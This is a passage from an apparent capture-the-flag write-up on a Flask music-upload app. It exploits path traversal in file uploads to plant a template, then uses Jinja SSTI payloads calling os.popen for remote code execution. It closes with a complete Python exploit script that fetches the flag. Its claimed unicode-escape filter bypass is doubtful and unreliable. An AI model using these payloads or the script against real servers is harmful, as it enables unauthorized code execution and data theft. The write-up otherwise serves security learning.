    try:

        if music_file and dst_file.split('.')[1] == 'mp3':

    return redirect(url_for('home'))
```

We are provided with the server-side code of this web application. Let's start analyzing the code to find vulnerabilities and determine ways to exploit them.

### `/ route`

```
@app.route('/')
def home():
    page = request.args.get('page')
    try:
        return render_template('home.html', page=f'{page}.html')
    except:
        return render_template('home.html')
```

The `/` endpoint takes a `page` parameter from the URL and appends `.html` to it. If a file with that name exists in the `templates` folder, it renders that page. Otherwise, it defaults to rendering `home.html`. This behavior is key to exploiting the vulnerability, as we will see later.

### `/music route`

```
@app.route('/music')
def music():
    music_files = filter(lambda f: f.endswith('.mp3'), os.listdir(app.config['UPLOAD_FOLDER']))
    return render_template('music.html', music_files=music_files)
```

The `/music` endpoint is designed to display only the files that end with `.mp3` on the `music.html` page. It does so by filtering the list of files in the upload folder and passing only those with the `.mp3` extension to the template.

### `/upload route`

Now, let’s dive into the interesting part of the code. 

```
@app.route('/upload', methods=['POST'])
def upload():
    def safe_filename(file):
        if '../' in file:
            return safe_filename(file.replace('../', ''))
        return file
    try:
        music_file = request.files.get('music_file')
        dst_file = safe_filename(music_file.filename)
        if music_file and dst_file.split('.')[1] == 'mp3':
            flash('File uploaded')
            music_file.save(os.path.join(app.config['UPLOAD_FOLDER'], dst_file))
        else:
            flash('File blocked')
    except RequestEntityTooLarge:
        flash('File is too large')
    return redirect(url_for('music'))

```

The `/upload` endpoint handles the upload of a `music_file` provided by the user. The uploaded file’s name is passed to the `safe_filename()` function to sanitize it.

```python
def safe_filename(file):
    if '../' in file:
        return safe_filename(file.replace('../', ''))
    return file
```

- The `safe_filename()` function recursively checks for `../` in the filename and removes it if found. This aims to prevent directory traversal, but it's not effective. This can be simply bypassed with `\u002e\` which is a unicode for `.`.

After sanitizing the filename, the code proceeds to check if the file extension is `mp3`. It does this by splitting the filename on the `.` character and checking whether the string after first `.` is `'mp3'`. However, this method is flawed and can be easily bypassed with filenames like `bypassed.mp3.php`, where the `.mp3` is just a misleading part of the filename. This superficial check does not fully validate the actual file type.

If the file passes the extension check, the following line of code is responsible for saving it:

```python
music_file.save(os.path.join(app.config['UPLOAD_FOLDER'], dst_file))
```

- The `os.path.join()` function joins the upload folder with the filename, creating the final upload path. In this application, `app.config['UPLOAD_FOLDER']` is set to `'./music_files/'`, which means that if the sanitized filename is `malicious.mp3`, the final save path would be `./music_files/malicious.mp3`.

However, here lies the main vulnerability: **`os.path.join()` is susceptible to path traversal attacks** because there is no validation to ensure that the final path remains within the intended `music_files` directory. For example, if a malicious filename like `../../evil.mp3` is somehow provided, and not sanitized adequately, it could allow the file to be saved outside of the intended folder, potentially overwriting critical files or saving in unauthorized locations.

In summary, the vulnerability arises due to the incomplete sanitization process and the lack of final path validation, which makes the endpoint susceptible to path traversal attacks. We can exploit this to save files in unintended directories, gaining unauthorized control over the file structure.



# Exploitation

We have to get Remote Code Execution (RCE) to retrieve the flag. One possible approach is to upload an HTML file to the templates (`/app/templates`) directory and achieve Server-Side Template Injection (SSTI) using it. Let’s begin the exploitation process.

There are two ways to solve this:

- Relative path
- Absolute path

### Relative Path Method

For the relative path method, we need `../` in our filename to reach the `templates` folder. However, as we know, `../` is being filtered. We can bypass this restriction by using the Unicode representation for `.` (`\u002e`). Thus, our filename would be `\u002e\u002e/templates/malicious.mp3.html`, which is equivalent to `../templates/malicious.mp3.html`. This allows us to navigate one directory back to where the `templates` folder is located, then move into the `templates` folder and save `malicious.mp3.html` there.

### Absolute Path Method

This method is simpler because we don't need to bypass the `../` filter. We can simply provide the absolute path, which is `/app/templates/malicious.mp3.html`. The `os.path.join` will save it to the absolute path, effectively ignoring `app.config['UPLOAD_FOLDER']` because an absolute path takes precedence over a relative path.


To exploit the SSTI vulnerability, we need a simple HTML file that can trigger SSTI when rendered. Below is a straightforward HTML file for this purpose:

```html
<html>
<head>
    <title>SSTI Exploit</title>
</head>
<body>
    <h1>Triggering SSTI</h1>
    <textarea type="text" id="page" name="page" >{{7*7}}<textarea>
</body>
</html>
```

In this file, our SSTI payload is placed in the `<textarea>` element. This will evaluate the expression `{{7*7}}` if SSTI is present, allowing us to confirm that the vulnerability works.

The file is uploaded, but how do we access it? We can only see the output if `malicious.mp3.html` is rendered. This is where the following line of code comes in handy:

```python
render_template('home.html', page=f'{page}.html')
```

We can render our `malicious.mp3.html` by passing the `page` parameter like this:

```
http://your-instance-url/?page=malicious.mp3
```

This will render our HTML, and the result of `7*7` (which is `49`) will be displayed in the `<textarea>` field, confirming that SSTI is successfully triggered.

## Final Payload for SSTI

Our final payload for SSTI will be:

```html
{{config.__class__.__init__.__globals__['os'].popen('ls -l /app').read()}}
```

This payload will get Remote Code Execution (RCE) using SSTI.

To execute this, simply replace the value and re-upload the file. Here is how the updated HTML file looks:

```
<html>
<head>
    <title>SSTI Exploit</title>
</head>
<body>
    <h1>Triggering SSTI</h1>
    <textarea type="text" id="page" name="page" >{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}</textarea>
</body>
</html>
```

After uploading, access the payload by visiting:

```
http://your-instance-url/?page=malicious.mp3
```

This will render the updated HTML and execute the command, showing the output of `ls -la` in the `<textarea>` field, thus achieving RCE.


# Python Automated Script

I wrote the python script to automate the whole process for retrieving the flag.

```
import requests
import os
from urllib.parse import urlencode
from urllib.parse import urlparse
from bs4 import BeautifulSoup

url = "your-instance-url/" #Add "/" at end of the URL

def upload_file():

    parsed_url = urlparse(url)
    hostname = parsed_url.netloc

    headers = {
        'Host': hostname,
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryu1i8nw4tZ1Hi1EN7',
        'Connection': 'keep-alive',
    }

    data = '''------WebKitFormBoundaryu1i8nw4tZ1Hi1EN7\r\nContent-Disposition: form-data; name="music_file"; filename="/app/templates/malicious.mp3.html"\r\nContent-Type: text/html\r\n\r\n<html>
    <head>
        <title>SSTI Exploit</title>
    </head>
    <body>
        <h1>Triggering SSTI</h1>
        <form action="/" method="get">
            <input type="text" id="page" name="page" value="{{config.__class__.__init__.__globals__['os'].popen('cat $(find / -name flag.txt 2>/dev/null)
 ').read()}}">
            <button type="submit">Submit</button>
        </form>
        <p id="output"></p>
    </body>
    </html>\r\n------WebKitFormBoundaryu1i8nw4tZ1Hi1EN7--\r\n'''

    upload_url = f"{url}upload"
    response = requests.post(upload_url, headers=headers, data=data, verify=False)

    if "File uploaded" in response.text:
        print("[*] File uploaded successfully.")
    else:
        print("[*] Upload failed.")
        print(response.text)


def access_payload():
    access_url = f"{url}?page=malicious.mp3"
    response = requests.get(access_url)
    if response.status_code == 200:
        print("[*] Payload executed successfully.")

        soup = BeautifulSoup(response.text, 'html.parser')
        input_tag = soup.find('input', {'id': 'page'})
        
        if input_tag and input_tag.has_attr('value'):
            output = input_tag['value'].strip() 

            if output:
                print(f"[*] Flag: {output}")
            else:
                print("Extracted value from input tag is empty.")
        else:
            print("Failed to locate the input element in the response.")
    else:
        print("Failed to execute payload.")

if __name__ == "__main__":

    upload_file()

    access_payload()
```
